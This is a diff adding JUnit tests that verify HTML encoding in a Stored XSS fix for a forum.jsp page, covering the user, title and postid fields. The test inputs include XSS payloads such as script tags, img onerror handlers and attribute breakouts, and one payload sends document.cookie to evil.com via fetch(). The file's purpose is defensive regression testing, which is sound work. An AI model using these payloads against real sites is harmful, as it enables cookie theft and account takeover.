@@ -2396,4 +2396,329 @@ public class SecondOrderSQLInjectionTest {
         assertTrue("Non-special characters in payload must be preserved",
                 rendered.contains("alert(document.cookie)"));
     }
+
+    // =========================================================================
+    // Tests for Stored XSS remediation in forum.jsp (CWE-79)
+    //
+    // The SAST finding (Stored_XSS) reports a taint path in forum.jsp:
+    //   SOURCE: rs = stmt.executeQuery("select * from posts")  [line 65]
+    //           The ResultSet contains user-supplied data (username, title,
+    //           postid) that was stored in the database at post creation time.
+    //   SINK:   out.print("...<a href='UserDetails.jsp?username=" +
+    //                      rs.getString("user") + "'>" +
+    //                      rs.getString("user") + "</a>")        [line 74]
+    //           Raw database values were written directly to the HTTP response
+    //           without HTML encoding, enabling Stored XSS.
+    //
+    // The fix replaces every out.print() rendering of RS values with
+    // JSTL <c:out value="${...}" escapeXml="true"/> after first storing
+    // each value in pageContext via pageContext.setAttribute().
+    //
+    // The tests below verify the HTML-escaping contract for all three
+    // database columns rendered in the posts table: user, title, postid.
+    // They mirror the behaviour of JSTL <c:out escapeXml="true"/> using
+    // the cOutEscape() helper already defined in this class.
+    // =========================================================================
+
+    /**
+     * Simulates the full anchor-tag rendering produced by the fixed forum.jsp
+     * for a non-anonymous post author.
+     *
+     * Fixed JSP template (rendered per row for non-anonymous users):
+     *   &lt;a href='UserDetails.jsp?username=&lt;c:out value="${postUser}"/&gt;'&gt;
+     *       &lt;c:out value="${postUser}"/&gt;
+     *   &lt;/a&gt;
+     *
+     * Both the URL-attribute value and the visible link text are passed through
+     * <c:out escapeXml="true"/>, so every XML special character is encoded.
+     */
+    private static String renderForumUserLink(String username) {
+        String encodedUser = cOutEscape(username);
+        return "<a href='UserDetails.jsp?username=" + encodedUser + "'>"
+                + encodedUser + "</a>";
+    }
+
+    /**
+     * Simulates the post-title cell rendering produced by the fixed forum.jsp.
+     *
+     * Fixed JSP template:
+     *   &lt;td&gt;&lt;a href='forumposts.jsp?postid=&lt;c:out value="${postid}"/&gt;'&gt;
+     *       &lt;c:out value="${postTitle}"/&gt;&lt;/a&gt;&lt;/td&gt;
+     */
+    private static String renderForumTitleCell(String postid, String title) {
+        return "<td><a href='forumposts.jsp?postid=" + cOutEscape(postid) + "'>"
+                + cOutEscape(title) + "</a></td>";
+    }
+
+    // -------------------------------------------------------------------------
+    // forum.jsp user-field XSS tests
+    // -------------------------------------------------------------------------
+
+    /**
+     * forum.jsp — a normal username (no special characters) must be rendered
+     * unchanged in both the href attribute and the link text.
+     * Positive-functionality / regression test.
+     */
+    @Test
+    public void testForumNormalUsernameRenderedUnchanged() {
+        String normalUser = "alice";
+        String rendered = renderForumUserLink(normalUser);
+
+        assertTrue("Normal username must appear verbatim in the href attribute",
+                rendered.contains("username=alice"));
+        assertTrue("Normal username must appear verbatim as link text",
+                rendered.contains(">alice<"));
+        assertFalse("Rendered output must not contain unintended encoding artifacts",
+                rendered.contains("&lt;") || rendered.contains("&gt;"));
+    }
+
+    /**
+     * forum.jsp — a username containing a script tag (stored at registration
+     * time, the classic Stored XSS vector) must be HTML-encoded so it cannot
+     * execute in the browser.
+     *
+     * Attack scenario:
+     *   1. Attacker registers with username: &lt;script&gt;alert(1)&lt;/script&gt;
+     *   2. The username is stored in the posts table.
+     *   3. forum.jsp previously rendered:
+     *        &lt;a href='...&lt;script&gt;alert(1)&lt;/script&gt;'&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/a&gt;
+     *      — script executes in both href and visible text contexts.
+     *   4. After the fix the output is:
+     *        &lt;a href='...&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;'&gt;&amp;lt;script&amp;gt;...&lt;/a&gt;
+     *      — plain text, no execution.
+     */
+    @Test
+    public void testForumScriptTagInUsernameIsEncoded() {
+        String xssPayload = "<script>alert(1)</script>";
+        String rendered = renderForumUserLink(xssPayload);
+
+        assertFalse("Raw '<script>' must not appear in the rendered href or link text",
+                rendered.contains("<script>"));
+        assertFalse("Raw '</script>' must not appear in the rendered output",
+                rendered.contains("</script>"));
+        assertTrue("'<' must be encoded as '&lt;' in the href attribute",
+                rendered.contains("&lt;script&gt;"));
+    }
+
+    /**
+     * forum.jsp — a username containing a double-quote that could break out of
+     * the href attribute context must be encoded.
+     *
+     * Before fix: href='UserDetails.jsp?username=evil" onmouseover="alert(1)'
+     *             → attribute injection creates an event handler.
+     * After fix:  href='UserDetails.jsp?username=evil&#034; onmouseover=...'
+     *             → treated as a literal query-parameter value.
+     */
+    @Test
+    public void testForumDoubleQuoteInUsernameIsEncoded() {
+        String attributeBreaker = "evil\" onmouseover=\"alert(1)\"";
+        String rendered = renderForumUserLink(attributeBreaker);
+
+        assertTrue("Double-quote must be encoded as '&#034;'",
+                rendered.contains("&#034;"));
+        // The injected event handler keyword must not survive unencoded
+        assertFalse("'onmouseover' event handler must not appear unencoded in rendered output",
+                rendered.contains("onmouseover=\""));
+    }
+
+    /**
+     * forum.jsp — a username containing single quotes that could break out of
+     * the href's single-quoted attribute context must be encoded.
+     *
+     * The href is wrapped in single quotes: href='...'. An attacker username
+     * of "x' onmouseover='alert(1)" would close the attribute and inject an
+     * event handler. After the fix, the single quote is encoded as &#039;.
+     */
+    @Test
+    public void testForumSingleQuoteInUsernameIsEncodedInHref() {
+        String singleQuotePayload = "x' onmouseover='alert(1)";
+        String rendered = renderForumUserLink(singleQuotePayload);
+
+        assertTrue("Single quote must be encoded as '&#039;'",
+                rendered.contains("&#039;"));
+        assertFalse("Raw single-quote that could close the href attribute must not appear unencoded",
+                rendered.contains("onmouseover='alert(1)"));
+    }
+
+    /**
+     * forum.jsp — a username containing an ampersand must be encoded to prevent
+     * HTML entity injection.
+     */
+    @Test
+    public void testForumAmpersandInUsernameIsEncoded() {
+        String ampersandUser = "user&amp;hacker";
+        String rendered = renderForumUserLink(ampersandUser);
+
+        // The raw '&' must be encoded; '&amp;' in input becomes '&amp;amp;'
+        assertFalse("Raw '&amp;' must not appear unencoded in context where it would be interpreted as entity",
+                rendered.contains("user&amp;hacker") && !rendered.contains("user&amp;amp;hacker"));
+        assertTrue("'&' must be encoded as '&amp;'",
+                rendered.contains("&amp;"));
+    }
+
+    /**
+     * forum.jsp — end-to-end Stored XSS scenario for the user field:
+     * the exact taint flow described in the SAST finding must be blocked.
+     *
+     * SAST reported sink: out.print("&lt;a href='UserDetails.jsp?username="
+     *                                + rs.getString("user") + "'&gt;"
+     *                                + rs.getString("user") + "&lt;/a&gt;")
+     *
+     * Attacker stores a payload at registration; forum.jsp reads it from DB
+     * via rs.getString("user") and previously wrote it unescaped to the page.
+     */
+    @Test
+    public void testForumStoredXssUserFieldBlockedEndToEnd() {
+        // Classic stored XSS payload: closes attribute, injects script element
+        String storedPayload = "alice\"><script>fetch('https://evil.com/?c='+document.cookie)</script>";
+        String rendered = renderForumUserLink(storedPayload);
+
+        // Must not be able to close the href's single-quote boundary
+        // (note: href uses single quotes, so the threat vector here is a ' not a ")
+        // The payload uses " which is different — verify both are neutralised
+        assertFalse("Raw '<script>' must not appear in rendered output",
+                rendered.contains("<script>"));
+        assertFalse("Raw '</script>' must not appear in rendered output",
+                rendered.contains("</script>"));
+        assertTrue("'<' in payload must be encoded as '&lt;'", rendered.contains("&lt;"));
+        assertTrue("'>' in payload must be encoded as '&gt;'", rendered.contains("&gt;"));
+        assertTrue("'\"' in payload must be encoded as '&#034;'", rendered.contains("&#034;"));
+    }
+
+    // -------------------------------------------------------------------------
+    // forum.jsp title-field XSS tests
+    // -------------------------------------------------------------------------
+
+    /**
+     * forum.jsp — a normal post title must be rendered unchanged in both the
+     * href (postid) and the visible title text.
+     */
+    @Test
+    public void testForumNormalTitleRenderedUnchanged() {
+        String rendered = renderForumTitleCell("42", "My First Post");
+
+        assertTrue("Post id must appear in the href attribute",
+                rendered.contains("postid=42"));
+        assertTrue("Title text must appear verbatim as link text",
+                rendered.contains(">My First Post<"));
+    }
+
+    /**
+     * forum.jsp — a post title containing a script injection (stored as a
+     * forum post title by an attacker) must be HTML-encoded.
+     *
+     * The title is rendered both inside the link href (as postid) and as the
+     * visible anchor text. The <c:out> fix encodes it in both positions.
+     */
+    @Test
+    public void testForumScriptTagInTitleIsEncoded() {
+        String xssTitle = "<script>alert(document.cookie)</script>Legitimate Title";
+        String rendered = renderForumTitleCell("5", xssTitle);
+
+        assertFalse("Raw '<script>' tag must not appear in title cell output",
+                rendered.contains("<script>"));
+        assertTrue("'<' in title must be encoded as '&lt;'",
+                rendered.contains("&lt;script&gt;"));
+    }
+
+    /**
+     * forum.jsp — a post title with an img onerror XSS payload must be
+     * encoded so the img tag cannot be injected into the page.
+     */
+    @Test
+    public void testForumImgOnerrorInTitleIsEncoded() {
+        String imgPayload = "Normal Title<img src=x onerror=alert(1)>";
+        String rendered = renderForumTitleCell("7", imgPayload);
+
+        assertFalse("Raw '<img' tag must not appear in rendered title",
+                rendered.contains("<img"));
+        assertTrue("'<' in img payload must be encoded as '&lt;'",
+                rendered.contains("&lt;img"));
+    }
+
+    // -------------------------------------------------------------------------
+    // forum.jsp postid-field XSS tests
+    // -------------------------------------------------------------------------
+
+    /**
+     * forum.jsp — a numeric postid must be rendered unchanged in the href.
+     */
+    @Test
+    public void testForumNumericPostidRenderedUnchanged() {
+        String rendered = renderForumTitleCell("123", "Some Title");
+        assertTrue("Numeric postid must appear verbatim in the href",
+                rendered.contains("postid=123"));
+    }
+
+    /**
+     * forum.jsp — a postid containing script-injection characters must be
+     * HTML-encoded to prevent href injection.
+     *
+     * An attacker who can control postid values could store a crafted value
+     * in the database; without encoding the href attribute context would be
+     * broken.
+     */
+    @Test
+    public void testForumXssInPostidIsEncoded() {
+        String xssPostid = "1\"><script>alert(1)</script><\"";
+        String rendered = renderForumTitleCell(xssPostid, "Title");
+
+        assertFalse("Raw '<script>' must not appear in postid href",
+                rendered.contains("<script>"));
+        assertTrue("'<' in postid must be encoded as '&lt;'",
+                rendered.contains("&lt;"));
+        assertTrue("'\"' in postid must be encoded as '&#034;'",
+                rendered.contains("&#034;"));
+    }
+
+    /**
+     * forum.jsp — verifies that all five XML special characters in a postid
+     * value are encoded by cOutEscape (matching JSTL <c:out> behaviour).
+     */
+    @Test
+    public void testForumAllSpecialCharsInPostidAreEncoded() {
+        String specialPostid = "<>&\"'";
+        String encodedPostid = cOutEscape(specialPostid);
+
+        assertEquals("All five XML special characters in postid must be encoded",
+                "&lt;&gt;&amp;&#034;&#039;", encodedPostid);
+    }
+
+    // -------------------------------------------------------------------------
+    // forum.jsp anonymous-user branch XSS tests
+    // -------------------------------------------------------------------------
+
+    /**
+     * forum.jsp — the anonymous-user branch renders the username directly
+     * (not in an anchor tag) via &lt;c:out&gt;. An XSS payload stored as
+     * the username "Anonymous" variant must still be encoded.
+     *
+     * Before fix (else branch): out.print(rs.getString("user"))
+     * After fix:                &lt;c:out value="${postUser}" escapeXml="true"/&gt;
+     */
+    @Test
+    public void testForumAnonymousUserXssPayloadIsEncoded() {
+        // Attacker stores a script payload as the user value, bypassing the
+        // equalsIgnoreCase("anonymous") check via case variation or suffix
+        String anonymousPayload = "Anonymous<script>alert(1)</script>";
+
+        // Simulate the anonymous branch: just cOutEscape the raw value
+        String rendered = cOutEscape(anonymousPayload);
+
+        assertFalse("Raw '<script>' must not appear in anonymous-user rendering",
+                rendered.contains("<script>"));
+        assertTrue("'<' in anonymous payload must be encoded as '&lt;'",
+                rendered.contains("&lt;"));
+    }
+
+    /**
+     * forum.jsp — a genuinely anonymous user value ("Anonymous") must be
+     * rendered unchanged (no special characters to encode).
+     */
+    @Test
+    public void testForumTrueAnonymousValueRenderedUnchanged() {
+        String rendered = cOutEscape("Anonymous");
+        assertEquals("'Anonymous' contains no special characters and must pass through unchanged",
+                "Anonymous", rendered);
+    }
 }
